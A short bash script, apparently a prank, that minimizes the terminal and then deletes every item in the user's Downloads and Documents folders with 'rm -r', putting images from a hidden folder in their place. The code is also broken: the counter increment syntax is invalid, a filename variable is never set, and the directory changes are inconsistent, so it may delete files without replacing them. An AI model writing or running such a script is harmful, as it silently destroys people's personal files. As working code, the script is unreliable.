#!/bin/bash

#Minimize Terminal
printf '\e[2t'

#Search in documents, downloads, desktop for folder
cd documents/Replace
cd downloads/Replace
cd desktop/Replace

#Copy the hidden folder of Stanford Images to the root directory and then go to the root directory
cp -r .8402559201 ~
cd ../../

#Cause a lot of rumpus in downloads
cd downloads
TICKER=1
for each in *
do
	echo "$TICKER"
	#export NAME= each |awk -F. '{ print $1 }'
	#echo $NAME	
	rm -r "$each"
	cp "../.8402559201/($TICKER).jpg" "$NAME.jpg"
	TICKER = "$TICKER" + 1
done

#Cause a lot of rumpus in documents
cd documents
TICKER=1
for each in *
do
	echo "$TICKER"
	export NAME= each |awk -F. '{ print $1 }'
	echo $NAME	
	rm -r "$each"
	cp "../.8402559201/($TICKER).jpg" "$NAME.jpg"
	TICKER = "$TICKER" + 1
done